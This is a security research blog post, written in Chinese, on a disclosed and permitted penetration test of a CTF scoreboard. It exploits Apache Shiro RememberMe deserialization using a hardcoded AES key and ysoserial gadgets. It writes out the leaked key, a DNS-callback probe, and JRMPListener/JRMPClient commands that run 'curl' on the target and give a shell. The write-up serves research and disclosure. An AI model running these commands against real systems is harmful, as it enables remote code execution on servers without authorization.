---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/
title: "Pwn a CTF Platform with Java JRMP Gadget | Orange Tsai"
author: "Orange Tsai"
published: 2018-03-25T16:00:00.000Z
description: "打 CTF 打膩覺得沒啥新鮮感嗎，來試試打掉整個 CTF 計分板吧! 前幾個月，剛好看到某個大型 CTF 比賽開放註冊，但不允許台灣參加有點難過 :( 看著官網最下面發現是 FlappyPig 所主辦，又附上 GitHub 原始碼 秉持著練習 Java code review 的精神就 git clone 下來找洞了! (以下測試皆在 FlappyPig 的允許下友情測試，漏洞回報官方後也經過"
---

* * *

打 CTF 打膩覺得沒啥新鮮感嗎，來試試打掉整個 CTF 計分板吧! 前幾個月，剛好看到某個大型 CTF 比賽開放註冊，但不允許台灣參加有點難過 :(

看著官網最下面發現是 FlappyPig 所主辦，又附上 [GitHub 原始碼](https://github.com/zjlywjh001/PhrackCTF-Platform-Team) 秉持著練習 Java code review 的精神就 git clone 下來找洞了!

_(以下測試皆在 FlappyPig 的允許下友情測試，漏洞回報官方後也經過同意發文)_

在有原始碼的狀況下進行 Java 的 code review 第一件事當然是去了解第三方 Libraries 的相依性，關於 Java 的生態系我也在 [幾年前的文章](http://blog.orange.tw/2016/12/java-web.html) 小小分享過，當有個底層函式庫出現問題時是整個上層的應用皆受影響!

從 `pom.xml` 觀察發現用了

1. Spring Framework 4.2.4
   - 從版本來看似乎很棒沒什麼重大問題
2. Mybatis 3.3.1
   - 一個 Java ORM
   - 似乎也沒看到用法有問題
3. Jackson 2.7.1
   - 出過反序列化漏洞
   - 不過 `enableDefaultTyping` 沒啟用，也無直接收取 JSON 輸入無法觸發漏洞
4. Apache Shiro 1.2.4
   - [【漏洞分析】Shiro RememberMe 1.2.4反序列化導致的命令執行漏洞](http://blog.knownsec.com/2016/08/apache-shiro-java/)
   - hmmm, 真好連版本都是對的，不過當然沒有這麼簡單XD

既然有現成的洞，當下即開始針對 Shiro 進行研究，首先遇到的第一個問題是照著文章內 PoC 的方式解密會發現失敗，看來是有自己修改過的怎麼辦QQ 不過翻著翻著原始碼在 `src/main/resources/spring-shiro.xml` 看到

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```<br><!-- rememberMe管理器 --><br><bean id="rememberMeManager" class="org.apache.shiro.web.mgt.CookieRememberMeManager"><br>    <!-- rememberMe cookie加密的密钥 建议每个项目都不一样 默认AES算法 密钥长度（128 256 512 位）--><br>    <property name="cipherKey"<br>              value="#{T(org.apache.shiro.codec.Base64).decode('cGhyYWNrY3RmREUhfiMkZA==')}"/><br>              <!-- Cookie加密密钥：phrackctfDE!~#$d --><br>    <property name="cookie" ref="rememberMeCookie"/><br></bean><br>``` |

真開心XD 把 AES Key 更正後解回來的東西有 `AC ED` 開頭看起來是序列化過後的資料，真棒

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>``` | ```<br>$ python decrypt.py cGhyYWNrY3RmREUhfiMkZA== | xxd <br>00000000: 9373 1385 4bb7 526f 7a97 f7c5 1e17 0da3  .s..K.Roz.......<br>00000010: aced 0005 7372 0032 6f72 672e 6170 6163  ....sr.2org.apac<br>00000020: 6865 2e73 6869 726f 2e73 7562 6a65 6374  he.shiro.subject<br>00000030: 2e53 696d 706c 6550 7269 6e63 6970 616c  .SimplePrincipal<br>00000040: 436f 6c6c 6563 7469 6f6e a87f 5825 c6a3  Collection..X%..<br>...<br>``` |

接著就是產 Gadget 丟到遠端伺服器拿 shell，但在這步怎麼也無法成功利用，有點殘念只好再繼續研究下去!

當時的猜想是:

> Apache Shiro 是一套實現身分驗證的 Library，而實現的方式可能有定義自己的 ClassLoader 因此導致現有的 Gadget 無法使用

_(尚無查證，不過在拿到 shell 後看到這篇文章 [Exploiting JVM deserialization vulns despite a broken class loader](https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html) 證明猜想也許是對的，不過這篇也沒實現 RCE XD)雖然無法跳至 Common Collection 但至少還有 JRE 本身的 Gadget 可以跳去做二次利用!_

綜觀 [ysoserial](https://github.com/frohoff/ysoserial) 除了 JRE 本身的洞外可利用的 Gadget 所剩無幾，先來試試 `URLDNS` 至少先確認漏洞存在再說!

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>$ java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://mydnsserver.orange.tw/ | python exp.py<br>``` |

發現 DNS 有回顯至少確認漏洞存在了，再繼續往下利用!下一步我選的 Gadget 則是 `JRMPClient`，由於 JRMP 是位於 RMI 底下的一層實作，所以走的也是反序列化的協議，”純猜測” 也許在這裡使用 ClassLoader 就不會是 Apache Shiro 而是原本的 ClassLoader

_(未查證，如有人可以幫忙查證請告訴我結果XD)_

但這裡又遇到一個問題是，如何實現一個 JRMP Server 去接送過來的 Protocol?

網路上並沒有人有提供 `JRMPClient` 要如何使用的教學及利用方式!本來想要手刻但找著找著資料找回 ysoserial 上的 [JRMPListener.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java)，讀了一下原始碼才驚覺 ysoserial 真棒，各種模組化及利用都幫你寫好了! ysoserial 分為兩個大部分，`payload` 以及 `exploit`，平常都只有用到產 payload 的部分而已，但實際上作者有寫好幾份可直接利用的 exploit 並模組化，讓我們可以直接利用!

所以最後的利用則是:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>$ java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'curl orange.tw'<br># listen 一個 RMI server 走 JRMP 協議在 12345 port 上<br>$ java -jar ysoserial-master-SNAPSHOT.jar JRMPClient '1.2.3.4:12345'  | python exp.py<br># 使用 JRMPClient 去連接剛剛 listen 的 server<br>``` |

如此一來就可以獲得 shell 惹!

![](https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/855e69324ed7b7e5-01.png)

# [Updates](https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/\#Updates "Updates") Updates

- 2018/03/27 01:23, Update
1. 經過比較詳細的分析，一開始失敗的詳細原因真是如同 [文章](https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html) 所說 Shiro 自己實現了一個 Buggy 的 ClassLoader
2. 所以 payload 當中出現 `ChainedTransformer` 或是 `InvokerTransformer` 都會出現 `Unable to deserialize argument byte array` 錯誤
3. 而內建的 `URLDNS` 及 `JRMPClient` 剛好沒用到上述方式實現 Gadget 所以可以使用!
4. 所以理論上透過 RMI 或是 JDNI 的方式應該也可以成功!
- 2018/03/27 10:09, Update
1. [留言](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html?showComment=1522113813029#c8534491035376047625) 中有人給出了更詳細的 root cause! - “Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。”
2. 感謝幫忙解惑 <(\_ \_)>